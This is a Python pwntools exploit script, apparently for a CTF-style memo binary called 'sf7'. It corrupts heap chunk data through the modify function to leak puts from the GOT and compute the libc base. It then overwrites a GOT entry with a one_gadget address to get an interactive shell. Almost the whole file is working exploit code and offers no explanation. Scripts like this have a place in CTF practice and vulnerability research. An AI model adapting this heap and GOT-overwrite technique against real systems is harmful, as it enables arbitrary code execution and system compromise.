from pwn import *
p = process('./sf7')
t = 0.05

### Gadget
puts_got = 0x602028
pop_rdi = 0x4010d3

### Definition
def choice(idx):
        p.sendlineafter("> ", str(idx))

def create_data(size, memo):
        choice(1)
        p.sendlineafter('size : ', str(size))
        p.sendafter('memo : ', memo)

def modify_data(memo, new_memo):
        choice(3)
        p.sendafter('memo : ', memo)
        sleep(t)
        p.sendafter('memo : ', new_memo)

def delete_data(memo):
        choice(4)
        p.sendafter('memo : ', memo)

def change_author(name):
        choice(5)
        p.sendafter(" : ", str(name))

def show():
        choice(2)


### Exploit
p.sendafter('name : ', p64(0xDEADBEEF))

# leak
create_data(0x10, 'a'*8)
create_data(0x10, 'b'*8)
create_data(0x10, 'c'*8)

pay = b''
pay += b'b'*0x8 + p64(0)
pay += p64(0) + p64(0x31)
pay += p64(0) + p64(puts_got)
pay += p64(puts_got)
modify_data('bbbbbbbb\x00', pay)

show()
p.recvuntil("[5]\n")
libc_puts = u64(p.recv(6) + b'\x00\x00')
libc_base = libc_puts - 0x6f6a0
one_list = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
one_gadget = libc_base + one_list[3]

log.info("libc_puts  : {}".format(hex(libc_puts)))
log.info("libc_base  : {}".format(hex(libc_base)))
log.info("one_gadget : {}".format(hex(one_gadget)))

change_author(p64(libc_puts))
# *** change chunk list head -> p64(libc_puts) ***

pay = b''
pay += p64(one_gadget)
modify_data(p64(libc_puts), pay)

p.interactive()